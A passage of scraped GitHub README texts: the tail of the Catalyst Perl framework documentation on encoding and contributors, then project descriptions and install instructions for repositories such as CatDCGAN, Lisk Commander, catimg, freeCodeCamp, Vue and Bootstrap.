hashref\nJust like the previous, except the following HashRef is used as arguments\nto initialize the middleware object.\n  __PACKAGE__->config(\n    'psgi_middleware', [\n       'Session' => {store => 'File'},\n  ]);\n\n\n\nPlease see PSGI for more on middleware.\nENCODING\nStarting in Catalyst version 5.90080 encoding is automatically enabled\nand set to encode all body responses to UTF8 when possible and applicable.\nFollowing is documentation on this process.  If you are using an older\nversion of Catalyst you should review documentation for that version since\na lot has changed.\nBy default encoding is now 'UTF-8'.  You may turn it off by setting\nthe encoding configuration to undef.\nMyApp->config(encoding => undef);\n\nThis is recommended for temporary backwards compatibility only.\nTo turn it off for a single request use the clear_encoding\nmethod to turn off encoding for this request.  This can be useful\nwhen you are setting the body to be an arbitrary block of bytes,\nespecially if that block happens to be a block of UTF8 text.\nEncoding is automatically applied when the content-type is set to\na type that can be encoded.  Currently we encode when the content type\nmatches the following regular expression:\n$content_type =~ /^text|xml$|javascript$/\n\nEncoding is set on the application, but it is copied to the context object\nso that you can override it on a request basis.\nBe default we don't automatically encode 'application/json' since the most\ncommon approaches to generating this type of response (Either via Catalyst::View::JSON\nor Catalyst::Action::REST) will do so already and we want to avoid double\nencoding issues.\nIf you are producing JSON response in an unconventional manner (such\nas via a template or manual strings) you should perform the UTF8 encoding\nmanually as well such as to conform to the JSON specification.\nNOTE: We also examine the value of $c->response->content_encoding.  If\nyou set this (like for example 'gzip', and manually gzipping the body)\nwe assume that you have done all the necessary encoding yourself, since\nwe cannot encode the gzipped contents.  If you use a plugin like\nCatalyst::Plugin::Compress you need to update to a modern version in order\nto have this function correctly  with the new UTF8 encoding code, or you\ncan use Plack::Middleware::Deflater or (probably best) do your compression on\na front end proxy.\nMethods\n\n\nencoding\nReturns an instance of an Encode encoding\n  print $c->encoding->name\n\n\n\nhandle_unicode_encoding_exception ($exception_context)\nMethod called when decoding process for a request fails.\nAn $exception_context hashref is provided to allow you to override the\nbehaviour of your application when given data with incorrect encodings.\nThe default method throws exceptions in the case of invalid request parameters\n(resulting in a 500 error), but ignores errors in upload filenames.\nThe keys passed in the $exception_context hash are:\n\n\nparam_value\nThe value which was not able to be decoded.\n\n\nerror_msg\nThe exception received from Encode.\n\n\nencoding_step\nWhat type of data was being decoded. Valid values are (currently)\nparams - for request parameters / arguments / captures\nand uploads - for request upload filenames.\n\n\n\n\nSUPPORT\nIRC:\nJoin #catalyst on irc.perl.org.\n\nMailing Lists:\nhttp://lists.scsys.co.uk/cgi-bin/mailman/listinfo/catalyst\nhttp://lists.scsys.co.uk/cgi-bin/mailman/listinfo/catalyst-dev\n\nWeb:\nhttp://catalyst.perl.org\n\nWiki:\nhttp://dev.catalyst.perl.org\n\nSEE ALSO\nTask::Catalyst - All you need to start with Catalyst\nCatalyst::Manual - The Catalyst Manual\nCatalyst::Component, Catalyst::Controller - Base classes for components\nCatalyst::Engine - Core engine\nCatalyst::Log - Log class.\nCatalyst::Request - Request object\nCatalyst::Response - Response object\nCatalyst::Test - The test suite.\nPROJECT FOUNDER\nsri: Sebastian Riedel sri@cpan.org\nCONTRIBUTORS\nabw: Andy Wardley\nacme: Leon Brocard leon@astray.com\nabraxxa: Alexander Hartmaier abraxxa@cpan.org\nandrewalker: Andr\u00e9 Walker andre@cpan.org\nAndrew Bramble\nAndrew Ford A.Ford@ford-mason.co.uk\nAndrew Ruthven\nandyg: Andy Grundman andy@hybridized.org\naudreyt: Audrey Tang\nbricas: Brian Cassidy bricas@cpan.org\nCaelum: Rafael Kitover rkitover@io.com\nchansen: Christian Hansen\nChase Venters chase.venters@gmail.com\nchicks: Christopher Hicks\nChisel Wright pause@herlpacker.co.uk\nDanijel Milicevic me@danijel.de\ndavewood: David Schmidt davewood@cpan.org\nDavid Kamholz dkamholz@cpan.org\nDavid Naughton naughton@umn.edu\nDavid E. Wheeler\ndhoss: Devin Austin dhoss@cpan.org\ndkubb: Dan Kubb dan.kubb-cpan@onautopilot.com\nDrew Taylor\ndwc: Daniel Westermann-Clark danieltwc@cpan.org\nesskar: Sascha Kiefer\nfireartist: Carl Franks cfranks@cpan.org\nfrew: Arthur Axel \"fREW\" Schmidt frioux@gmail.com\ngabb: Danijel Milicevic\nGary Ashton Jones\nGavin Henry ghenry@perl.me.uk\nGeoff Richards\ngroditi: Guillermo Roditi groditi@gmail.com\nhobbs: Andrew Rodland andrew@cleverdomain.org\nilmari: Dagfinn Ilmari Manns\u00e5ker ilmari@ilmari.org\njcamacho: Juan Camacho\njester: Jesse Sheidlower jester@panix.com\njhannah: Jay Hannah jay@jays.net\nJody Belka\nJohan Lindstrom\njon: Jon Schutz jjschutz@cpan.org\nJonathan Rockway jrockway@cpan.org\nKieren Diment kd@totaldatasolution.com\nkonobi: Scott McWhirter konobi@cpan.org\nmarcus: Marcus Ramberg mramberg@cpan.org\nmiyagawa: Tatsuhiko Miyagawa miyagawa@bulknews.net\nmgrimes: Mark Grimes mgrimes@cpan.org\nmst: Matt S. Trout mst@shadowcatsystems.co.uk\nmugwump: Sam Vilain\nnaughton: David Naughton\nningu: David Kamholz dkamholz@cpan.org\nnothingmuch: Yuval Kogman nothingmuch@woobling.org\nnuma: Dan Sully daniel@cpan.org\nobra: Jesse Vincent\nOctavian Rasnita\nomega: Andreas Marienborg\nOleg Kostyuk cub.uanic@gmail.com\nphaylon: Robert Sedlacek phaylon@dunkelheit.at\nrafl: Florian Ragwitz rafl@debian.org\nrandom: Roland Lammel lammel@cpan.org\nrevmischa: Mischa Spiegelmock revmischa@cpan.org\nRobert Sedlacek rs@474.at\nSpiceMan: Marcel Montes\nsky: Arthur Bergman\nszbalint: Balint Szilakszi szbalint@cpan.org\nt0m: Tomas Doran bobtfish@bobtfish.net\nUlf Edvinsson\nvanstyn: Henry Van Styn vanstyn@cpan.org\nViljo Marrandi vilts@yahoo.com\nWill Hawes info@whawes.co.uk\nwillert: Sebastian Willert willert@cpan.org\nwreis: Wallace Reis wreis@cpan.org\nYuval Kogman nothingmuch@woobling.org\nrainboxx: Matthias Dietrich perl@rainboxx.de\ndd070: Dhaval Dhanani dhaval070@gmail.com\nUpasana me@upasana.me\nJohn Napiorkowski (jnap) jjnapiork@cpan.org\nCOPYRIGHT\nCopyright (c) 2005-2015, the above named PROJECT FOUNDER and CONTRIBUTORS.\nLICENSE\nThis library is free software. You can redistribute it and/or modify it under\nthe same terms as Perl itself."}, {"title": "simoninithomas/CatDCGAN", "language": "Jupyter Notebook", "content": "CatDCGAN \ud83d\udc31\u200d\ud83d\udcbb\nA DGAN that generate Cat pictures\n\n\n Cat DCGAN is a Deep Convolutional Generative Adversarial Network (DCGAN) that generates pictures of cats \nThis is an open source project \n\nThe tutorial \ud83d\udcc3\nIf you want to implement it by yourself and understand how it works, please read my article on FreeCodeCamp https://medium.freecodecamp.org/how-ai-can-learn-to-generate-pictures-of-cats-ba692cb6eae4\n\nLinks \ud83d\udd17\n\ud83c\udf10 : https://simoninithomas.github.io/CatDCGAN/\n\n If you have any questions,  feel free to ask me:  \n \ud83d\udce7: hello@simoninithomas.com \n Github: https://github.com/simoninithomas/CatDCGAN \n \ud83c\udf10 : https://www.simoninithomas.com \n Twitter: @ThomasSimonini \nIn this part we're going to implement the DCGAN.\nOur Architecture:\n\nGetting Started \ud83d\udcdd\n\nDownload the dataset here: https://www.kaggle.com/crawford/cat-dataset\n Download the model checkpoint  : https://drive.google.com/drive/folders/1zdZZ91fjOUiOsIdAQKZkUTATXzqy7hiz?usp=sharing\nType sh start.sh it will handle extract, remove outliers, normalization and face centering\nLaunch Jupyter Notebook jupyter notebook --no-browser\nLaunch CatDCGAN\nChange do_preprocess = True \u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f important!\n If you want to train from scratch : change from_checkpoint = False\n If you want to train from last model saved (you save 20 hours of training \ud83c\udf89) : change from_checkpoint = True\n\nImportant note \ud83e\udd14\n You can't run this on your computer  (except if you have GPUs or wait 10 years \ud83d\ude05), personally I train this DCGAN for 20 hours with Microsoft Azure and their Deep Learning Virtual Machine (they offer 170$)\nhttps://azuremarketplace.microsoft.com/en-us/marketplace/apps/microsoft-ads.dsvm-deep-learning\n\n\u26a0\ufe0f I don't have any business relations with them. I just loved their excellent customer service.\nIf you have some troubles to use follow the explainations of this excellent article here (without last the part fast.ai): https://medium.com/@manikantayadunanda/setting-up-deeplearning-machine-and-fast-ai-on-azure-a22eb6bd6429\nContributing \ud83d\ude4c\nIf you want to contribute to the project, your help is very welcome. This is an open source project.\n\nWe currently working on improving our Generative adversarial network architecture. If you're motivated come join us and submit your pull requests.\nAcknowledgements \ud83d\udc4f\nThis project was made possible thanks to:\n\nUdacity Face Generator Project\nThe start.sh and preprocess part (modified) made by Alexia Jolicoeur-Martineau https://ajolicoeur.wordpress.com/cats/\nSiraj's Raval PokeGan https://github.com/llSourcell/Pokemon_GAN\nThe choice of learning rate by Alexia Jolicoeur-Martineau https://ajolicoeur.wordpress.com/cats/"}, {"title": "lexiross/fattest-cat", "language": "JavaScript", "content": "Some cats are born fat, some achieve fatness, others have fatness thrust upon them. You can find all of them at the San Francisco SPCA using this tool.\nInstall\nCompatible with node 6+\nnpm install -g fattest-cat\nUsage\nStandard\n$ fattest-cat\nMetric units\n$ fattest-cat --metric\nGarfield Mode\n$ fattest-cat --garfield"}, {"title": "CatacombGames/Catacomb3D", "language": "C++", "content": "Catacomb 3-D: The Descent\nThis repository contains the source code for Catacomb 3-D (also known as\nCatacombs 3 or Catacomb 3-D: A New Dimension). The source code is designed for\nBorland C++ 2.0, but compiled fine with Borland C++ 3.1 at the time of this\nrelease.\nIt is released under the GNU GPLv2. Please see COPYING for license details.\nThis release does not affect the licensing for the game data files. You will\nneed to legally acquire the game data in order to use the exe built from this\nsource code."}, {"title": "LiskArchive/lisk-commander", "language": "TypeScript", "content": "Lisk Commander\nLisk Commander allows you to communicate with a remote or local node and carry out Lisk-related functionality.\n\n\n\n\nPrerequisites\nLisk Commander requires Node.js as the underlying engine for code execution. Node.js is supported on most operating systems. Follow the instructions for your operating system on the Node.js downloads page. We currently require Node.js versions 8.3 and above. NPM is automatically installed along with Node.js.\nInstallation\nFrom NPM\n$ npm install --global --production lisk-commander\nUpon successful completion, NPM will add the lisk-commander executable lisk to your PATH.\nFrom Source\nClone the Lisk Commander repository using Git and install the dependencies:\n$ git clone https://github.com/LiskHQ/lisk-commander.git\n$ cd lisk-commander\n$ npm install\nBefore running the executable you will need to build Lisk Commander:\nnpm run build\nAdding the Lisk Commander executable to your PATH\nWARNING: If you have installed Lisk Commander globally via NPM (see Install Lisk Commander via NPM), following the instructions in this section is not recommended as they will introduce conflicts.\nIf you would like to add the lisk executable to your PATH you have two options: option 1 will install the current state of the code you are installing globally, while option 2 will only link to the code and therefore automatically reflect changes you make going forward.\n1. Install globally\nRunning this command from within the repository will add Lisk Commander to your global NPM packages, and add the lisk executable to your PATH. Be aware that any previous globally installed Lisk Commander version will get overridden with this local version.\n$ npm install --global --production\nNote that you will have to repeat this process for each subsequent build of Lisk Commander.\n2. Create a symlink\nThe other option is to ask NPM to create a symlink in the global folder that links to the package.\n$ npm link\nThis will also add lisk to your PATH, but you won't have to repeat the process if you pull or create a new build. Be aware that any previous globally installed Lisk Commander version will get overridden with this local version.\nUsage\n$ lisk COMMAND\nrunning command...\n$ lisk (-v|--version|version)\nlisk-commander/2.0.0 darwin-x64 node-v8.12.0\n$ lisk --help [COMMAND]\nA command line interface for Lisk\n\nVERSION\n  lisk-commander/2.0.0 darwin-x64 node-v8.12.0\n\nUSAGE\n  $ lisk [COMMAND]\n\nCOMMANDS\n  account      Commands relating to Lisk accounts.\n  block        Commands relating to Lisk blocks.\n  config       Manages Lisk Commander configuration.\n  copyright    Displays copyright notice.\n  delegate     Commands relating to Lisk delegates.\n  help         Displays help.\n  message      Commands relating to user messages.\n  node         Commands relating to Lisk node.\n  passphrase   Commands relating to Lisk passphrases.\n  signature    Commands relating to signatures for Lisk transactions from multisignature accounts.\n  transaction  Commands relating to Lisk transactions.\n  warranty     Displays warranty notice.\nCommands\n\nlisk account - Commands relating to Lisk accounts.\nlisk block - Commands relating to Lisk blocks.\nlisk config - Manages Lisk Commander configuration.\nlisk copyright - Displays copyright notice.\nlisk delegate - Commands relating to Lisk delegates.\nlisk help - Displays help.\nlisk message - Commands relating to user messages.\nlisk node - Commands relating to Lisk node.\nlisk passphrase - Commands relating to Lisk passphrases.\nlisk signature - Commands relating to signatures for Lisk transactions from multisignature accounts.\nlisk transaction - Commands relating to Lisk transactions.\nlisk warranty - Displays warranty notice.\n\nDocumentation\nFurther information can be found on our documentation site:\n\nIntroduction\nSetup\nUpgrade\nUser Guide\n\nSensitive Inputs\nCommands\n\n\n\nGet Involved\nLisk Commander is an open-source project and all contributions are welcome.\nIf you find a bug or want to make feature request, please create an issue with as much detail as you can.\nRun Tests\nLisk Commander has an extensive set of unit tests. To run the tests, please install Lisk Commander from source, and then run the command:\n$ npm test\nFAQ\nSomething else went wrong. What should I do?\n\nMake sure you\u2019re on the network you intend to be on.\nRemove the configuration file (config.json) located in your Lisk Commander configuration directory (~/.lisk by default). When you restart Lisk Commander the default configuration will be recreated.\nGet in contact on Lisk Chat or Gitter.\nIf it seems like a bug, open an issue on GitHub. See the Contribution Guidelines.\n\nContributors\nhttps://github.com/LiskHQ/lisk-commander/graphs/contributors\nLicense\nCopyright \u00a9 2017\u20132018 Lisk Foundation\nThis program is free software: you can redistribute it and/or modify it under\nthe terms of the GNU General Public License as published by the Free Software\nFoundation, either version 3 of the License, or (at your option) any later\nversion.\nThis program is distributed in the hope that it will be useful, but WITHOUT ANY\nWARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A\nPARTICULAR PURPOSE. See the GNU General Public License for more details.\nYou should have received a copy of the GNU General Public License\nalong with this program. If not, see http://www.gnu.org/licenses/."}, {"title": "rancher/catalog-dockerfiles", "language": "Shell", "content": "Dockerfiles for Rancher Catalog Items.\n\nPurpose\nThese are the Dockerfiles for the containers that we use for Rancher entries in the community catalog. Also, you will find compose files that are here for development purposes.\nLayout\nEach App has its own folder. There is a containers directory where the various containers for the apps are kept. We try to version the directories to the version of the container.\nLicense\nCopyright (c) 2014-2016 Rancher Labs, Inc.\nLicensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at\nhttp://www.apache.org/licenses/LICENSE-2.0\nUnless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License."}, {"title": "opencats/OpenCATS", "language": "PHP", "content": "OpenCATS\n\n\nOpenCATS is a Free and Open Source Candidate/Applicant Tracking System designed for Recruiters to manage recruiting process from job posting, candidate application, through to candidate selection and submission.\nMore details:\nhttp://www.opencats.org\nEnd user/Installation  documentation:\nhttp://opencats-documentation.readthedocs.io/en/latest/\nOpenCATS YouTube channel:\nhttps://www.youtube.com/channel/UChJ_YF1w74o8iWFAYa9w0xQ\nDevelopers Mailing List:\nhttps://groups.google.com/forum/#!forum/opencats-dev\nSupport Forums:\nhttp://forums.opencats.org\nInstallation Procedure:\nWindows: http://opencats-documentation.readthedocs.io/en/latest/install-windows.html\nLinux: http://opencats-documentation.readthedocs.io/en/latest/\n\nIssues:\nOpen Issues"}, {"title": "cadejscroggins/catz", "language": "PHP", "content": "Catz\n\nDownload all the things.\n\nDevelopment Setup\nTODO"}, {"title": "atnos-org/eff", "language": "Scala", "content": "eff\n\n\n\nExtensible effects are an alternative to monad transformers for computing with effects in a functional way.\nThis library is based on the \"free-er\" monad and extensible effects described in\nOleg Kiselyov in Freer monads, more extensible effects.\nYou can learn more in the User Guide:\n\nyour first effects\nincluded effects: Reader, Writer, Eval, State,...\ncreate your own effects\nuse Member implicits\nworking with different effect stacks\na tutorial similar to the cats' tutorial for Free monads\n\nYou can also check out this presentation at flatMap Oslo 2016 (slides).\nInstallation\nYou add eff as an sbt dependency:\n// check maven badge above for latest version\nlibraryDependencies += \"org.atnos\" %% \"eff\" % \"5.1.0\"\n\n// to write types like Reader[String, ?]\naddCompilerPlugin(\"org.typelevel\" %% \"kind-projector\" % \"0.10.0\")\n\n// to get types like Reader[String, ?] (with more than one type parameter) correctly inferred for scala 2.11.11+ and 2.12.x\nscalacOptions += \"-Ypartial-unification\"\n\n// to get types like Reader[String, ?] (with more than one type parameter) correctly inferred for scala 2.11.9 and before\n// you can use the [Typelevel Scala compiler](http://typelevel.org/scala)\nscalaOrganization in ThisBuild := \"org.typelevel\"\nContributing\neff is a Typelevel project. This means we embrace pure, typeful, functional programming,\nand provide a safe and friendly environment for teaching, learning, and contributing as described in the Scala Code of Conduct.\nFeel free to open an issue if you notice a bug, have an idea for a feature, or have a question about the code. Pull requests are also gladly accepted."}, {"title": "whatthejeff/nyancat-phpunit-resultprinter", "language": "PHP", "content": "Requirements\nThe Nyan Cat result printer for PHPUnit requires:\n\nPHP 7+.\nPHPUnit 6+.\nA terminal emulator with support for ANSI escape sequences, including color\nand cursor control.\n\nUse version ^1.3 to support PHPUnit 4.8+ / 5+.\nNOTE: By default, the Windows console does not support ANSI escape\nsequences. If you'd like to use the Nyan Cat result printer on Windows, you\nmay want to try one of the following solutions:\n\nANSICON\nConEmu\n\nInstallation\nThe recommended way to install the Nyan Cat result printer for PHPUnit is\nthrough composer. Just create a composer.json file\nand run the composer install command to install it:\n{\n    \"require-dev\": {\n        \"whatthejeff/nyancat-phpunit-resultprinter\": \"^2.0\"\n    }\n}\nOnce installed, add the following attributes to the <phpunit> element in your\nphpunit.xml file:\nprinterFile=\"vendor/whatthejeff/nyancat-phpunit-resultprinter/src/NyanCat/PHPUnit/ResultPrinter.php\"\nprinterClass=\"NyanCat\\PHPUnit\\ResultPrinter\"\n\nNOTE: If PHPUnit was not installed via composer, you also need to include\nthe composer autoloader. One easy way to do this is to add the following\nattribute to the <phpunit> element in your phpunit.xml file:\nbootstrap=\"vendor/autoload.php\"\n\nTests\n\nTo run the test suite, you need composer.\n$ composer install\n$ composer test\n\nAcknowledgements\nThe Nyan Cat result printer for PHPUnit was heavily inspired by the\nglorious mocha/nyan.js.\nLicense\nThe Nyan Cat result printer for PHPUnit is licensed under the MIT license."}, {"title": "posva/catimg", "language": "C", "content": "Catimg\nRenders images in the terminal.\n\ncatimg is a little program written in C with no dependencies that prints images in terminal.\nIt supports JPEG, PNG and GIF formats. This program was originally a script that\ndid the same by using ImageMagick convert.\nInstallation\nHomebrew\nbrew install catimg\nArch Linux\nyaourt -S catimg\nFedora 25 and later\ndnf -y install catimg\nBuilding\ncmake .\nmake install\nScript Dependencies\nIn order to use the script you need:\n\nImageMagick 6.6.0-4 2012-08-17 Q16 (Not tested with earlier versions)\nshell with 256 colors support ( change the #!/usr/bin/env bash by\nyours). In OS X you just have to update the bash version using\nHomebrew (or any other method).\n\nExamples\n\nHigh Resolution vs Low Resolution\nBy using unicode characters catimg will try to display pictures in higher resolution. You can force the resolution with the -r option.\n\n\nDifferences between Script and C version\nScript version is way more accurate concerning colors but considerably\nslower.\nContributing\nI'm open to any contributions that helps catimg! If you find bugs, please\ncreate an issue or do a pull request \ud83d\ude04.\nLicense\nMIT\nCopyright (c) Eduardo San Martin Morote\nSupport on Beerpay\nHey dude! Help me out for a couple of \ud83c\udf7b!"}, {"title": "freeCodeCamp/freeCodeCamp", "language": "JavaScript", "content": "Welcome to freeCodeCamp.org's open source codebase and curriculum!\nfreeCodeCamp.org is a friendly community where you can learn to code for free. It is run by a donor-supported 501(c)(3) nonprofit with the goal of helping millions of busy adults transition into tech. Our community has already helped more than 10,000 people get their first developer job.\nOur full-stack web development curriculum is completely free and self-paced. We have thousands of interactive coding challenges to help you expand your skills.\nTable of Contents\n\nCertifications\nThe Learning Platform\nFound a Bug\nFound a Security Issue\nContributing\nLicense\n\nCertifications\nfreeCodeCamp.org offers several free developer certifications. Each of these certifications involves building 5 required web app projects, along with hundreds of optional coding challenges to help you prepare for those projects. We estimate that each certification will take a beginning programmer around 300 hours to earn.\nEach of these 30 projects in the freeCodeCamp.org curriculum has its own agile user stories and automated tests. These help you build up your project incrementally and ensure you've fulfilled all the user stories before you submit it.\nYou can pull in these test suites through freeCodeCamp's CDN. This means you can build these projects on websites like CodePen and Glitch - or even on your local computer's development environment.\nOnce you\u2019ve earned a certification, you will always have it. You will always be able to link to it from your LinkedIn or r\u00e9sum\u00e9. And when your prospective employers or freelance clients click that link, they\u2019ll see a verified certification specific to you.\nThe one exception to this is in the event that we discover violations of our Academic Honesty Policy. When we catch people unambiguously plagiarizing (submitting other people's code or projects as their own without citation), we do what all rigorous institutions of learning should do - we revoke their certifications and ban those people.\nHere are our six core certifications:\n1. Responsive Web Design Certification\n\nBasic HTML and HTML5\nBasic CSS\nApplied Visual Design\nApplied Accessibility\nResponsive Web Design Principles\nCSS Flexbox\nCSS Grid\n\n\nProjects: Tribute Page, Survey Form, Product Landing Page, Technical Documentation Page, Personal Portfolio Webpage\n\n2. JavaScript Algorithms and Data Structures Certification\n\nBasic JavaScript\nES6\nRegular Expressions\nDebugging\nBasic Data Structures\nAlgorithm Scripting\nObject Oriented Programming\nFunctional Programming\nIntermediate Algorithm Scripting\n\n\nProjects: Palindrome Checker, Roman Numeral Converter, Caesar's Cipher, Telephone Number Validator, Cash Register\n\n3. Front End Libraries Certification\n\nBootstrap\njQuery\nSass\nReact\nRedux\nReact and Redux\n\n\nProjects: Random Quote Machine, Markdown Previewer, Drum Machine, JavaScript Calculator, Pomodoro Clock\n\n4. Data Visualization Certification\n\nData Visualization with D3\nJSON APIs and Ajax\n\n\nProjects: Bar Chart, Scatterplot Graph, Heat Map, Choropleth Map, Treemap Diagram\n\n5. APIs and Microservices Certification\n\nManaging Packages with Npm\nBasic Node and Express\nMongoDB and Mongoose\n\n\nProjects: Timestamp Microservice, Request Header Parser, URL Shortener, Exercise Tracker, File Metadata Microservice\n\n6. Information Security and Quality Assurance Certification\n\nInformation Security with HelmetJS\nQuality Assurance and Testing with Chai\nAdvanced Node and Express\n\n\nProjects: Metric-Imperial Converter, Issue Tracker, Personal Library, Stock Price Checker, Anonymous Message Board\n\nFull Stack Development Certification\nOnce you have earned all 6 of these certifications, you'll be able to claim your freeCodeCamp.org Full Stack Development Certification. This final distinction signifies that you\u2019ve completed around 1,800 hours of coding with a wide range of web development tools.\nLegacy Certifications\nWe also have 3 legacy certifications from our 2015 curriculum, which are still available. All of the required projects for these legacy certifications will remain available on freeCodeCamp.org.\n\nLegacy Front End Development Certification\nLegacy Data Visualization Certification\nLegacy Back End Development Certification\n\nThe Learning Platform\nThis code is running live at freeCodeCamp.org.\nOur community also has:\n\nA forum where you can usually get programming help or project feedback within hours.\nA YouTube channel with free courses on Python, SQL, Android, and a wide variety of other technologies.\nA podcast with technology insights and inspiring stories from developers.\nLocal study groups around the world, where you can code together in person\nA comprehensive guide to thousands of programming topics\nMedium's largest technical publication\nA Facebook group with over 100,000 members worldwide\n\nJoin our community here.\nFound a bug?\nIf you think you've found a bug, first read the Help I've Found a Bug article and follow its instructions. If you're confident it's a new bug, and have confirmed that someone else is facing the same issue, go ahead and create a new GitHub issue. Be sure to include as much information as possible so we can reproduce the bug.\nFound a security issue?\nPlease don't create GitHub issues for security issues. Instead, please send an email to security@freecodecamp.org and we'll look into it immediately.\nContributing\nPlease follow these steps to contribute.\nLicense\nCopyright \u00a9 2019 freeCodeCamp.org\nThe content of this repository is bound by the following licenses:\n\nThe computer software is licensed under the BSD-3-Clause license.\nThe learning resources in the /curriculum and /guide directories including their subdirectories thereon are licensed under the CC-BY-SA-4.0 license."}, {"title": "vuejs/vue", "language": "JavaScript", "content": "Supporting Vue.js\nVue.js is an MIT-licensed open source project with its ongoing development made possible entirely by the support of these awesome backers. If you'd like to join them, please consider:\n\nBecome a backer or sponsor on Patreon.\nBecome a backer or sponsor on Open Collective.\nOne-time donation via PayPal or crypto-currencies.\n\nWhat's the difference between Patreon and OpenCollective?\nFunds donated via Patreon go directly to support Evan You's full-time work on Vue.js. Funds donated via OpenCollective are managed with transparent expenses and will be used for compensating work and expenses for core team members or sponsoring community events. Your name/logo will receive proper recognition and exposure by donating on either platform.\nSpecial Sponsors\n\n\n\n\n\nPlatinum Sponsors\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPlatinum Sponsors (China)\n\n\n\n\n\n\n\n\n\n\n\nGold Sponsors\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSponsors via Open Collective\nPlatinum\n\n\nGold\n\n\n\n\n\n\nIntroduction\nVue (pronounced /vju\u02d0/, like view) is a progressive framework for building user interfaces. It is designed from the ground up to be incrementally adoptable, and can easily scale between a library and a framework depending on different use cases. It consists of an approachable core library that focuses on the view layer only, and an ecosystem of supporting libraries that helps you tackle complexity in large Single-Page Applications.\nBrowser Compatibility\nVue.js supports all browsers that are ES5-compliant (IE8 and below are not supported).\nEcosystem\n\n\n\nProject\nStatus\nDescription\n\n\n\n\nvue-router\n\nSingle-page application routing\n\n\nvuex\n\nLarge-scale state management\n\n\nvue-cli\n\nProject scaffolding\n\n\nvue-loader\n\nSingle File Component (*.vue file) loader for webpack\n\n\nvue-server-renderer\n\nServer-side rendering support\n\n\nvue-class-component\n\nTypeScript decorator for a class-based API\n\n\nvue-rx\n\nRxJS integration\n\n\nvue-devtools\n\nBrowser DevTools extension\n\n\n\nDocumentation\nTo check out live examples and docs, visit vuejs.org.\nQuestions\nFor questions and support please use the official forum or community chat. The issue list of this repo is exclusively for bug reports and feature requests.\nIssues\nPlease make sure to read the Issue Reporting Checklist before opening an issue. Issues not conforming to the guidelines may be closed immediately.\nChangelog\nDetailed changes for each release are documented in the release notes.\nStay In Touch\n\nTwitter\nBlog\nJob Board\n\nContribution\nPlease make sure to read the Contributing Guide before making a pull request. If you have a Vue-related project/component/tool, add it with a pull request to this curated list!\nThank you to all the people who already contributed to Vue!\n\nLicense\nMIT\nCopyright (c) 2013-present, Yuxi (Evan) You"}, {"title": "twbs/bootstrap", "language": "JavaScript", "content": "Bootstrap\n\n  Sleek, intuitive, and powerful front-end framework for faster and easier web development.\n  \nExplore Bootstrap docs \u00bb\n\n\nReport bug\n  \u00b7\n  Request feature\n  \u00b7\n  Themes\n  \u00b7\n  Blog\n\nTable of contents\n\nQuick start\nStatus\nWhat's included\nBugs and feature requests\nDocumentation\nContributing\nCommunity\nVersioning\nCreators\nThanks\nCopyright and license\n\nQuick start\nSeveral quick start options are available:\n\nDownload the latest release.\nClone the repo: git clone https://github.com/twbs/bootstrap.git\nInstall with npm: npm install bootstrap\nInstall with yarn: yarn add bootstrap@4.3.1\nInstall with Composer: composer require twbs/bootstrap:4.3.1\nInstall with NuGet: CSS: Install-Package bootstrap Sass: Install-Package bootstrap.sass\n\nRead the Getting started page for information on the framework contents, templates and examples, and more.\nStatus\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nWhat's included\nWithin the download you'll find the following directories and files, logically grouping common assets and providing both compiled and minified variations. You'll see something like this:\nbootstrap/\n\u2514\u2500\u2500 dist/\n    \u251c\u2500\u2500 css/\n    \u2502   \u251c\u2500\u2500 bootstrap-grid.css\n    \u2502   \u251c\u2500\u2500 bootstrap-grid.css.map\n    \u2502   \u251c\u2500\u2500 bootstrap-grid.min.css\n    \u2502   \u251c\u2500\u2500 bootstrap-grid.min.css.map\n    \u2502   \u251c\u2500\u2500 bootstrap-reboot.css\n    \u2502   \u251c\u2500\u2500 bootstrap-reboot.css.map\n    \u2502   \u251c\u2500\u2500 bootstrap-reboot.min.css\n    \u2502   \u251c\u2500\u2500 bootstrap-reboot.min.css.map\n    \u2502   \u251c\u2500\u2500 bootstrap.css\n    \u2502   \u251c\u2500\u2500 bootstrap.css.map\n    \u2502   \u251c\u2500\u2500 bootstrap.min.css\n    \u2502   \u2514\u2500\u2500 bootstrap.min.css.map\n    \u2514\u2500\u2500 js/\n        \u251c\u2500\u2500 bootstrap.bundle.js\n        \u251c\u2500\u2500 bootstrap.bundle.js.map\n        \u251c\u2500\u2500 bootstrap.bundle.min.js\n        \u251c\u2500\u2500 bootstrap.bundle.min.js.map\n        \u251c\u2500\u2500 bootstrap.esm.js\n        \u251c\u2500\u2500 bootstrap.esm.js.map\n        \u251c\u2500\u2500 bootstrap.esm.min.js\n        \u251c\u2500\u2500 bootstrap.esm.min.js.map\n        \u251c\u2500\u2500 bootstrap.js\n        \u251c\u2500\u2500 bootstrap.js.map\n        \u251c\u2500\u2500 bootstrap.min.js\n        \u2514\u2500\u2500 bootstrap.min.js.map\n\nWe provide compiled CSS and JS (bootstrap.*), as well as compiled and minified CSS and JS (bootstrap.min.*). source maps (bootstrap.*.map) are available for use with certain browsers' developer tools. Bundled JS files (bootstrap.bundle.js and minified bootstrap.bundle.min.js) include Popper.\nBugs and feature requests\nHave a bug or a feature request? Please first read the issue guidelines and search for existing and closed issues. If your problem or idea is not addressed yet, please open a new issue.\nDocumentation\nBootstrap's documentation, included in this repo in the root directory, is built with Hugo and publicly hosted on GitHub Pages at https://getbootstrap.com/. The docs may also be run locally.\nDocumentation search is powered by Algolia's DocSearch. Working on our search? Be 